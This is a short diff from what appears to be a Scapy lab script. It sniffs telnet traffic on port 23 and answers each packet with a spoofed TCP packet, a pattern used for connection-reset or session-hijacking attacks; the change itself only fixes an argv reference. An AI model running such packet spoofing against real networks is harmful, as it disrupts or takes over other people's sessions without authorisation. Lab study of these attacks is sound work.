@@ -10,4 +10,4 @@ def spoof_tcp(pkt):
    spoofpkt = IPLayer/TCPLayer
    ls(spoofpkt)
    send(spoofpkt, verbose=0)
-pkt=sniff(iface=argv[1], filter='tcp and port 23', prn=spoof_tcp) #br-3cba7ed65b16
+pkt=sniff(iface=sys.argv[1], filter='tcp and port 23', prn=spoof_tcp) #br-3cba7ed65b16
